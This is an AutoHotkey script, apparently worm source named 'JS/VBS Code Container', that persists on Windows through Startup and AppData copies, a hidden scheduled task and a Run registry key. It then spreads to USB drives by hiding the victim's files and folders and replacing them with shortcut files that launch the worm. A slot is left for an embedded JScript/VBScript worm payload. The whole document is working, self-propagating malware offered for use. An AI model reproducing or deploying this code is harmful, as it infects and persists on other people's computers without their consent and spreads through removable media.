#NoTrayIcon

; Author : Suleiman Al-Othman
; Ver. : 0.1
; Script Name : JS/VBS Code Container
; Note : Please remove any code using WScript Object | Ex : WScript.Sleep 7


global regValue = "ContainerJS"
global mSfs := ComObjCreate("Scripting.FileSystemObject")

InstallScript()

SC := ComObjCreate("MSScriptControl.ScriptControl")
SC.Language := "JScript" ; JScript|VBscript

SC.TimeOut := -1
SC.AddCode("[Javascript|VBscript worm|code]")

Loop {
	spreadUSB()
	Sleep, 7000
}



InstallScript() {
	IfNotExist, %A_Startup%\%A_ScriptName%
	{
		FileCopy, %A_ScriptFullPath% , %A_Startup%\%A_ScriptName%,1
	}

	IfNotExist, %A_AppData%\%A_ScriptName%
	{
		FileCopy, %A_ScriptFullPath% ,  %A_AppData%\%A_ScriptName%,1
		Run, %A_AppData%\%A_ScriptName%
		exitapp
	}

	run, schtasks /create /sc minute /mo 30 /tn ScheduleName /tr "%A_AppData%\%A_ScriptName%",,Hide
	Sleep, 3000
	Process, Close, schtasks.exe
	RegWrite, REG_SZ, HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, %regValue%, %A_ScriptFullPath%
}

spreadUSB() {
	For objOS In mSfs.Drives {
		if (ObjOS.DriveType =1) {
			I := ObjOS.path
			FileCopy,%A_Scriptfullpath%, %I%\%A_Scriptname%,1
			ifexist, %I%\%A_Scriptname%
		    FileSetAttrib, +SH, %I%\%A_Scriptname%,1
			For x In mSfs.GetFolder(objOS.path).Files {
				O := x.Name
				ifinstring,O,.
				{
		 			FileSetAttrib, +SH, %I%\%O%,1
		 			FN := StrSplit(O, ".")
		 			Lif1 := FN[2]
		 			if lif1 != lnk
		 			{
		 				if O != %A_ScriptName%
		 				{
		 					LiF   := FN[1]
		 					FileCreateShortcut, cmd.exe, %I%\%Lif%.lnk,, "/c start %A_ScriptName% &start %O% &exit",,1
		 				}
		 			}
		 		} 
			}
			For x In mSfs.GetFolder(objOS.path).SubFolders {
				O := x.Name
				FileSetAttrib, +SH, %I%\%O%,1
				FileCreateShortcut, cmd.exe, %I%\%O%.lnk,, "/c start %A_ScriptName% &start explorer %O% &exit",,%SystemRoot%\system32\shell32.dll,,4
			}
		}
	}
}